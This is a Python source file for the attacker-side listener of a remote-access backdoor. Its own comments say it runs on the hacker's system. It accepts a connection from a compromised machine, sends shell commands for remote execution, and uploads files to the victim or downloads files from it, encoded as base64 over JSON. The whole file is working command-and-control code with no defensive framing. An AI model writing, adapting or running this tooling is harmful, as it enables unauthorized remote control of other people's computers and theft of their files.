#!/usr/bin/env python3
# will be run on the hacker's system acting as a server
import socket,json,base64,shlex
import argparse
#import re
#import subprocess

class Listener:
    BUFFER_SIZE = 1024
    def __init__(self,ip,port):
        self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        self.listener.bind((ip,port))
        self.listener.listen(0)
        print('waiting for incoming connection..')
        self.connection,address = self.listener.accept()
        print('..got a connection from ' + str(address))

    def reliable_receive(self):
        # handle json messages > buffer size
        json_data = b""  # binary
        while True:
            try:
                json_data = json_data + self.connection.recv(Listener.BUFFER_SIZE)
                return json.loads(json_data)
            except ValueError:
                continue   
            

    def reliable_send(self,data):    
        json_data = json.dumps(data) 
        self.connection.send(json_data.encode())

    def execute_remotely(self,command):
        self.reliable_send(command)
        return self.reliable_receive()
        
    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read()) #binary and convert to base64

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return("..Upload Succesful")


    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ") # a list
            print(command)
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)   # execute on victim's system hosting the backdoor

                if command[0] == "download" and "Error" not in result:
                    result = self.write_file(command[1],result)
            except Exception:
                result = " Error during command Execution"     
            #
            print(result)       
            
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s","--server",help="ip number of server - eg.  10.0.2.16")
    parser.add_argument("-p","--port",help="port of server - eg.  4444",type=int)
    options= parser.parse_args()
    return options
#main.connect
if __name__ == "__main__":
    options = get_arguments()
    server = options.server
    port = options.port
    print(server + ':' + str(port))
    my_listener = Listener(server,port)
    my_listener.run()
    